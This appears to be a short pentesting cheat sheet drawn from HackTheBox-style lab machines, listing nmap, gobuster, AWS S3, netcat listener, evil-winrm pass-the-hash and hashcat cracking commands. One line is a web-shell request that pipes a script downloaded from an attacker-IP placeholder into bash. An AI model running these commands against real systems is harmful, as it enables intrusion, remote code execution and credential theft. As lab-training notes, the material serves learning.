## 🧰 Frequently Used Pentesting Commands

### 🔍 Enumeration
```bash
nmap -sC -sV -p- --min-rate 1000 10.129.54.238 -v
```

### 🌐 Virtual Host & Directory Discovery
```bash
gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
gobuster dir --url http://ignition.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### ☁️ AWS S3 Bucket Enumeration
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

### 🐚 Shell & Reverse Shell
```bash
nc -nvlp 1337
python3 -m http.server 8000
```

### 🪝 Web-based Reverse Shell Execution
```bash
http://thetoppers.htb/shell.php?cmd=curl%<attacking machine ip>:8000/shell.sh|bash
```

### 🕒 Time Synchronization (Useful for Kerberos/AD)
```bash
ntpdate pool.ntp.org  # Sync system clock with NTP server to avoid time skew issues
```

### 🔐 Evil-WinRM Access
```bash
evil-winrm -i administrator.htb -u administrator -H <NTLM_hash>   # Login using NTLM hash
evil-winrm -i administrator.htb -u administrator -p <password>    # Login using password

### 🔓 Cracking Hashes with Hashcat
```bash
# Auto-detect hash mode (not recommended for reliability)
hashcat -a 0 hash.txt /home/kali/Documents/rockyou.txt

# Specified mode (Apache $apr1$ MD5)
hashcat -m 1600 -a 0 hash.txt /home/kali/Documents/rockyou.txt
```